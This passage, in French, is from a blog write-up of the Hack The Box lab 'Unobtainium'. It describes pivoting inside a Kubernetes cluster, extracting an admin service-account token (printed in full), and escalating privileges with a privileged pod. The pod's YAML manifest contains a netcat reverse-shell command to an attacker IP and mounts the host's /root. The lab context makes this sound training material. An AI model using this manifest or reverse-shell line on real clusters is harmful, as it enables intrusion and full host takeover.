+<p>Je peux utiliser la commande <a href="https://v1-17.docs.kubernetes.io/docs/reference/generated/kubectl/kubectl-commands#describe">describe</a> pour afficher les détails d&rsquo;un objet kubernetes comme l&rsquo;indique ce <a href="https://kubernetes.io/fr/docs/reference/kubectl/cheatsheet/">cheatsheet</a>. Après énumération et si je comprends bien l&rsquo;explication de cet <a href="https://devopssec.fr/article/gerer-manipuler-replicasets-kubernetes#begin-article-section">article</a>, on retrouve trois répliques du pod <code>devnode-deployment</code> avec le ReplicaSet <code>cd86fb5c</code> ayant chacun une adresse unique. Si j&rsquo;affiche les détails, ils contiennent tous une image <code>localhost:5000/node_server</code> qui tourne sur le port <code>3000</code>.</p>
+<p><img src="/img/unobtainium/uno-detail.png" alt=""></p>
+<p>Il y a donc deux environnements différents <code>webapp</code> et <code>devnode</code>. Pour continuer, je vais devoir pivoter vers cet environnement en faisant du <code>port forwarding</code> de l&rsquo;un des trois conteneurs ci-dessus. J&rsquo;utilisais <code>chisel</code> pour cela, la première chose à faire est de le <a href="https://github.com/jpillora/chisel">télécharger</a> et le transférer sur la target.</p>
+<p><img src="/img/unobtainium/uno-chisel.png" alt=""></p>
+<p>Maintenant que c&rsquo;est fait, (1) on exécute le server chisel sur la machine d&rsquo;attaque sur le port <code>4444</code> et (2) le client chisel sur la target. Comme précédemment (3) j&rsquo;exécute la commande pour exploiter la vulnérabilité prototype pollution, mais cette fois-ci en localhost sur le port <code>3000</code>. (4) on encode un reverse shell TCP bash et exécute la même commande que précédemment pour récupèrer un shell sur le pod <code>devnode-deployment</code>.</p>
+<p><img src="/img/unobtainium/uno-devpod.png" alt=""></p>
+<p>A nouveau, je transfère le binaire <code>kubectluks</code> sur la nouvelle target et lui assigne les droits d&rsquo;exécution.</p>
+<h3 id="elévation-de-privilèges---root">Elévation de privilèges - root</h3>
+<p>On peut utiliser la commande <a href="https://v1-17.docs.kubernetes.io/docs/reference/generated/kubectl/kubectl-commands#auth">auth can-i</a> pour vérifier si une action spécifique est autorisée. Comme par exemple lister les secrets de l&rsquo;espace de nommage <code>dev</code>, ça ne fonctionne pas en revanche on peut le faire sur le namespace <code>kube-system</code> et on peut notamment lister le token de l&rsquo;administrateur.</p>
+<p><img src="/img/unobtainium/uno-secrets.png" alt=""></p>
+<p>Je peux le récupérer en affichant les détails du secret.</p>
+<p><img src="/img/unobtainium/uno-token.png" alt=""></p>
+<p><code>token:eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow</code></p>
+<p>Maintenant que je dispose du token de l&rsquo;admin, je peux l&rsquo;utiliser pour afficher des information sur le cluster avec la commande <code>cluster-info</code> pour retrouver notamment l&rsquo;adresse du master et des services</p>
+<p><img src="/img/unobtainium/uno-cluster.png" alt=""></p>
+<p>En faisant une recherche avec les mots clés <code>privilege escalation kubernetes with token</code>, je retrouve cet <a href="https://labs.bishopfox.com/tech-blog/bad-pods-kubernetes-pod-privilege-escalation#Pod1">article</a> de BishopFox qui présente plusieurs façons de faire une élévation de privilèges sur k8s et notamment par le biais de la création de pods. Je vais donc vérifier si j&rsquo;ai la possibilité de le faire</p>
+<p><img src="/img/unobtainium/uno-create.png" alt=""></p>
+<p>La réponse est oui ! Je vais donc utiliser le <a href="https://github.com/BishopFox/badPods/blob/main/manifests/everything-allowed/pod/everything-allowed-revshell-pod.yaml">repo</a> de badPods pour obtenir un reverse shell.</p>
+<p><code>lukspod.yaml</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml"><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">v1</span>
+<span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Pod</span>
+<span style="color:#f92672">metadata</span>:
+  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">lukspod</span>
+  <span style="color:#f92672">labels</span>:
+    <span style="color:#f92672">app</span>: <span style="color:#ae81ff">pentest</span>
+<span style="color:#f92672">spec</span>:
+  <span style="color:#f92672">hostNetwork</span>: <span style="color:#66d9ef">true</span>
+  <span style="color:#f92672">hostPID</span>: <span style="color:#66d9ef">true</span>
+  <span style="color:#f92672">hostIPC</span>: <span style="color:#66d9ef">true</span>
+  <span style="color:#f92672">containers</span>:
+  - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">lukspod</span>
+    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">localhost:5000/dev-alpine</span>
+    <span style="color:#f92672">command</span>: [<span style="color:#e6db74">&#34;/bin/sh&#34;</span>]
+    <span style="color:#f92672">args</span>: [<span style="color:#e6db74">&#34;-c&#34;</span>, <span style="color:#e6db74">&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.15.149 9002 &gt;/tmp/f; sleep 100000&#39;</span>]
+    <span style="color:#f92672">securityContext</span>:
+      <span style="color:#f92672">privileged</span>: <span style="color:#66d9ef">true</span>
+    <span style="color:#f92672">volumeMounts</span>:
+    - <span style="color:#f92672">mountPath</span>: <span style="color:#ae81ff">/root</span>
+      <span style="color:#f92672">name</span>: <span style="color:#ae81ff">noderoot</span>
+  <span style="color:#75715e">#nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name</span>
+  <span style="color:#f92672">volumes</span>:
+  - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">noderoot</span>
+    <span style="color:#f92672">hostPath</span>:
+      <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/root/</span>
+</code></pre></div><p>Je transfère le fichier sur la target et j&rsquo;ouvre un listener sur le port <code>9002</code>. Pour terminer je créer le nouveau pod à partir du fichier .yaml pour obtenir un reverse shell et récupérer le dernier flag <code>root.txt</code>. 😊</p>
+<p><img src="/img/unobtainium/uno-root2.png" alt=""></p>
+    
+</div>
+
+    
+<div class="footer">
+
+
+    
+        <div class="tags">
+            <i class="fa fa-tags"></i>
+            <div class="links">
+                
+                    
+                    
+                    <a href="//luksec.fr/fr/tags/sendbox-escape/">sendbox escape</a>
+                    
+                
+                    
+                    
+                    <a href="//luksec.fr/fr/tags/kubernetes/">kubernetes</a>
+                    
+                
+                    
+                    
+                    <a href="//luksec.fr/fr/tags/nodejs/">nodejs</a>
+                    
+                
+            </div>
+        </div>
+    
+
+    
+    <div class="languages">
+        <i class="fa fa-language"></i>
+        <div class="links">
+            
+                <a href="//luksec.fr/article/unobtainium/">en</a>
+            
+        </div>
+    </div>
+    
+</div>
+
+</article>
+
+        
+    </div>
+
+    
+        <div id="comments-container">
+            
+            
+
+        </div>
+    
+
+    </div>
+
+    
+<footer>
+    <div class="container">
+
+        
+        <div class="recent-posts">
+            <strong>Derniers articles</strong>
+            <ul>
+                
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/trick/">Hack The Box - Trick</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/fcsc2022-forensic/">FCSC 2022 - Forensic</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/fcsc2022-web/">FCSC 2022 - Web</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/fcsc2022-intro/">FCSC 2022 - Intro</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/bountyhunter/">Hack The Box - BountyHunter</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/advuln/">Mise en place d&#39;un environnement AD vulnérable</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/spring4shell/">TryHackMe - Spring4shell</a>
+                    </li>
+                
+            </ul>
+        </div>
+        
+
+        
+        <div class="categories">
+            <a href="/fr/categories/"><strong>Catégories</strong></a>
+            <ul>
+                
+                <li>
+                    <a href="/fr/categories/ctf">Ctf
+                        (27)</a>
+                </li>
+                
+                <li>
+                    <a href="/fr/categories/htb">Htb
+                        (24)</a>
+                </li>
+                
+                <li>
+                    <a href="/fr/categories/write-up">Write up
+                        (22)</a>
+                </li>
+                
+                <li>
+                    <a href="/fr/categories/linux">Linux
+                        (17)</a>
+                </li>
+                
+                <li>
+                    <a href="/fr/categories/windows">Windows
+                        (4)</a>
+                </li>
+                
+                <li>
+                    <a href="/fr/categories/fcsc">Fcsc
+                        (3)</a>
+                </li>
+                
+                <li>
+                    <a href="/fr/categories/writeup">Writeup
+                        (3)</a>
+                </li>
+                
+            </ul>
+        </div>
+        
+
+        <div class="right">
+            
+            <div class="external-profiles">
+                <strong>Des médias sociaux</strong>
+
+                
+                <a href="https://twitter.com/luksec_" target="_blank"><i class="fab fa-twitter"></i></a>
+                
+                <a href="https://github.com/0xLuks" target="_blank"><i class="fab fa-github"></i></a>
+                
+            </div>
+            
+
+            <div class="languages">
+                <strong>Autres langues</strong>
+                
+                
+                <a href="//luksec.fr/">en</a>
+                
+                
+                
+                <a href="//luksec.fr/fr/" class="active">fr</a>
+                
+                
+                <br><br>
+                <script src="https://www.hackthebox.eu/badge/483643"></script>
+            </div>
+            
+        </div>
+    </div>
+    <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="luks" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18">
+    </script>
+</footer>
+
+
+<div class="credits">
+    <div class="container">
+        <div class="copyright">
+            <a href="https://github.com/Lednerb" target="_blank">
+                &copy;
+                
+                2022
+                
+                by Lucas L.
+            </a>
+            
+        </div>
+        <div class="author">
+            <a href="https://github.com/Lednerb/bilberry-hugo-theme"
+                target="_blank">Bilberry Hugo Theme</a>
+        </div>
+    </div>
+</div>
+
+
+    
+
+    
+
+
+    <script type="text/javascript" src="//luksec.fr/theme.js"></script>
+
+    
+    
+    
+
+    
+</body>
+
+</html>
